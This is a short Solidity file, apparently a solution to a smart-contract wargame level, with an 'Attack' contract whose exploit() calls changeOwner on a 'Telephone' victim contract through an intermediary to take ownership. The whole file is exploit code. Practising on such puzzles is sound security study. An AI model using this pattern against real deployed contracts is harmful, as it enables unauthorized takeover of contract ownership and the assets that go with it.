// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface Telephone{
  function changeOwner(address) external;
}
contract Attack {
  function exploit(address victim,address _owner) public{
    Telephone(victim).changeOwner(_owner);
  }
}